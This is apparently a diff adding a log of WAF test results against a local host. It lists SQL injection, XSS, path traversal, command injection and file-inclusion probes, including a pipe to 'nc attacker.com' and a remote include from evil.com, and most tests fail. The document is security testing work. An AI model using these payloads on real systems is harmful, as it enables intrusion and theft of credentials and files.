@@ -1,0 +1,311 @@
+WAF Comprehensive Test Results - Thu Oct  9 12:27:21 PM EEST 2025
+Host: test.lock
+=====================================
+
+INFO: Starting comprehensive WAF tests...
+INFO: All results will be logged to: waf_test_results_20251009_122721.log
+=== 1. BASIC CONNECTIVITY TESTS ===
+Test: Homepage accessible
+  URL: http://test.lock:8000/
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Unexpected response (HTTP 400)
+Test: Analytics dashboard
+  URL: http://test.lock:8000/analytics/
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Unexpected response (HTTP 400)
+Test: Sites list page
+  URL: http://test.lock:8000/sites/
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Unexpected response (HTTP 400)
+Test: WAF templates page
+  URL: http://test.lock:8000/waf-templates/
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Unexpected response (HTTP 400)
+Test: Security logs page
+  URL: http://test.lock:8000/logs/
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Unexpected response (HTTP 400)
+Test: Caddy status page
+  URL: http://test.lock:8000/caddy/status/
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Unexpected response (HTTP 400)
+=== 2. SQL INJECTION TESTS ===
+Test: SQL Injection: OR 1=1
+  URL: http://test.lock:8000/?id=1' OR '1'='1
+  Method: GET
+  HTTP Code: 000
+✗ FAIL: Expected block but got HTTP 000
+Test: SQL Injection: UNION SELECT
+  URL: http://test.lock:8000/?user=admin' UNION SELECT * FROM users--
+  Method: GET
+  HTTP Code: 000
+✗ FAIL: Expected block but got HTTP 000
+Test: SQL Injection: DROP TABLE
+  URL: http://test.lock:8000/?id=1; DROP TABLE users--
+  Method: GET
+  HTTP Code: 000
+✗ FAIL: Expected block but got HTTP 000
+Test: SQL Injection: Comment injection
+  URL: http://test.lock:8000/?search=test'--
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Expected block but got HTTP 400
+Test: SQL Injection: Hex encoded
+  URL: http://test.lock:8000/?id=0x31
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Expected block but got HTTP 400
+Test: SQL Injection: Time-based blind
+  URL: http://test.lock:8000/?id=1' AND SLEEP(5)--
+  Method: GET
+  HTTP Code: 000
+✗ FAIL: Expected block but got HTTP 000
+=== 3. CROSS-SITE SCRIPTING (XSS) TESTS ===
+Test: XSS: Script tag
+  URL: http://test.lock:8000/?name=<script>alert('XSS')</script>
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Expected block but got HTTP 400
+Test: XSS: Image onerror
+  URL: http://test.lock:8000/?img=<img src=x onerror=alert('XSS')>
+  Method: GET
+  HTTP Code: 000
+✗ FAIL: Expected block but got HTTP 000
+Test: XSS: JavaScript protocol
+  URL: http://test.lock:8000/?link=javascript:alert('XSS')
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Expected block but got HTTP 400
+Test: XSS: Event handler
+  URL: http://test.lock:8000/?data=<body onload=alert('XSS')>
+  Method: GET
+  HTTP Code: 000
+✗ FAIL: Expected block but got HTTP 000
+Test: XSS: SVG vector
+  URL: http://test.lock:8000/?svg=<svg/onload=alert('XSS')>
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Expected block but got HTTP 400
+Test: XSS: Encoded script
+  URL: http://test.lock:8000/?code=%3Cscript%3Ealert('XSS')%3C/script%3E
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Expected block but got HTTP 400
+=== 4. PATH TRAVERSAL TESTS ===
+Test: Path Traversal: ../../../etc/passwd
+  URL: http://test.lock:8000/static/../../../etc/passwd
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Expected block but got HTTP 400
+Test: Path Traversal: Dot-dot-slash
+  URL: http://test.lock:8000/files/../../secrets.txt
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Expected block but got HTTP 400
+Test: Path Traversal: Encoded dots
+  URL: http://test.lock:8000/%2e%2e%2f%2e%2e%2fpasswd
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Expected block but got HTTP 400
+Test: Path Traversal: Windows style
+  URL: http://test.lock:8000/files/..\..\..\windows\system32\config\sam
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Expected block but got HTTP 400
+Test: Path Traversal: Null byte
+  URL: http://test.lock:8000/../../etc/passwd%00.jpg
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Expected block but got HTTP 400
+=== 5. COMMAND INJECTION TESTS ===
+Test: Command Injection: Semicolon
+  URL: http://test.lock:8000/?cmd=test; cat /etc/passwd
+  Method: GET
+  HTTP Code: 000
+✗ FAIL: Expected block but got HTTP 000
+Test: Command Injection: Pipe
+  URL: http://test.lock:8000/?input=data | nc attacker.com 1234
+  Method: GET
+  HTTP Code: 000
+✗ FAIL: Expected block but got HTTP 000
+Test: Command Injection: Backticks
+  URL: http://test.lock:8000/?exec=`whoami`
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Expected block but got HTTP 400
+Test: Command Injection: Dollar paren
+  URL: http://test.lock:8000/?run=$(id)
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Expected block but got HTTP 400
+Test: Command Injection: AND operator
+  URL: http://test.lock:8000/?cmd=ls && cat /etc/shadow
+  Method: GET
+  HTTP Code: 000
+✗ FAIL: Expected block but got HTTP 000
+=== 6. FILE INCLUSION TESTS ===
+Test: LFI: /etc/passwd
+  URL: http://test.lock:8000/?file=/etc/passwd
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Expected block but got HTTP 400
+Test: LFI: proc/self/environ
+  URL: http://test.lock:8000/?page=/proc/self/environ
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Expected block but got HTTP 400
+Test: RFI: External PHP
+  URL: http://test.lock:8000/?include=http://evil.com/shell.php
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Expected block but got HTTP 400
+Test: LFI: PHP wrapper
+  URL: http://test.lock:8000/?file=php://filter/convert.base64-encode/resource=index.php
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Expected block but got HTTP 400
+=== 7. XML EXTERNAL ENTITY (XXE) TESTS ===
+Test: XXE: External entity
+  URL: http://test.lock:8000/api/xml
+  Method: POST
+  HTTP Code: 400
+✗ FAIL: Expected block but got HTTP 400
+Test: XXE: Parameter entity
+  URL: http://test.lock:8000/api/xml
+  Method: POST
+  HTTP Code: 400
+✗ FAIL: Expected block but got HTTP 400
+=== 8. HEADER INJECTION TESTS ===
+Test: Header Injection: CRLF in User-Agent
+✗ FAIL: CRLF injection not blocked (HTTP 400)
+=== 9. MALICIOUS USER-AGENT TESTS ===
+Test: Malicious UA: Nikto scanner
+✗ FAIL: Nikto not blocked
+Test: Malicious UA: SQLMap
+✗ FAIL: SQLMap not blocked
+Test: Legitimate UA: Chrome browser
+✗ FAIL: Legitimate UA blocked
+=== 10. SUSPICIOUS PATTERN TESTS ===
+Test: Suspicious: eval() function
+  URL: http://test.lock:8000/?code=eval(base64_decode('malicious'))
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Expected block but got HTTP 400
+Test: Suspicious: base64 decode
+  URL: http://test.lock:8000/?data=base64_decode(JTNDc2NyaXB0JTNFYWxlcnQoMSklM0MlMkZzY3JpcHQlM0U=)
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Expected block but got HTTP 400
+Test: Suspicious: /etc/shadow access
+  URL: http://test.lock:8000/?file=/etc/shadow
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Expected block but got HTTP 400
+Test: Suspicious: phpinfo()
+  URL: http://test.lock:8000/?exec=phpinfo()
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Expected block but got HTTP 400
+=== 11. RATE LIMITING TESTS ===
+Test: Rate Limiting: Send 20 rapid requests
+INFO: Sending rapid requests to test rate limiting...
+  Successful: 0, Blocked: 0
+INFO: Rate limiting may not be active or threshold not reached
+=== 12. LEGITIMATE REQUEST TESTS ===
+Test: Legitimate: Normal search query
+  URL: http://test.lock:8000/?search=django+web+framework
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Unexpected response (HTTP 400)
+Test: Legitimate: Pagination
+  URL: http://test.lock:8000/sites/?page=1
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Unexpected response (HTTP 400)
+Test: Legitimate: Filter by status
+  URL: http://test.lock:8000/sites/?status=active
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Unexpected response (HTTP 400)
+Test: Legitimate: Date range
+  URL: http://test.lock:8000/logs/?start_date=2024-01-01&end_date=2024-12-31
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Unexpected response (HTTP 400)
+Test: Legitimate: Analytics with days parameter
+  URL: http://test.lock:8000/analytics/?days=7
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Unexpected response (HTTP 400)
+=== 13. API ENDPOINT TESTS ===
+Test: API: Geographic data
+  URL: http://test.lock:8000/api/analytics/test-lock/geographic/
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Unexpected response (HTTP 400)
+Test: API: Timeline data
+  URL: http://test.lock:8000/api/analytics/test-lock/timeline/
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Unexpected response (HTTP 400)
+Test: API: Top IPs
+  URL: http://test.lock:8000/api/analytics/test-lock/top-ips/
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Unexpected response (HTTP 400)
+Test: API: Request methods
+  URL: http://test.lock:8000/api/analytics/test-lock/methods/
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Unexpected response (HTTP 400)
+=== 14. UNICODE & ENCODING TESTS ===
+Test: Unicode: Script tag
+  URL: http://test.lock:8000/?xss=%u003cscript%u003ealert(1)%u003c/script%u003e
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Expected block but got HTTP 400
+Test: Double encoding: Script
+  URL: http://test.lock:8000/?xss=%253Cscript%253Ealert(1)%253C%252Fscript%253E
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Expected block but got HTTP 400
+Test: UTF-8 overlong: Slash
+  URL: http://test.lock:8000/%C0%AF
+  Method: GET
+  HTTP Code: 400
+✗ FAIL: Expected block but got HTTP 400
+=== 15. HTTP METHOD ABUSE TESTS ===
+Test: HTTP Method: TRACE
+✗ FAIL: TRACE allowed
+Test: HTTP Method: DELETE on protected resource
+✗ FAIL: DELETE allowed
+=== 16. SPECIAL EDGE CASES ===
+Test: Edge Case: Extremely long URL
+  URL: http://test.lock:8000/?aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa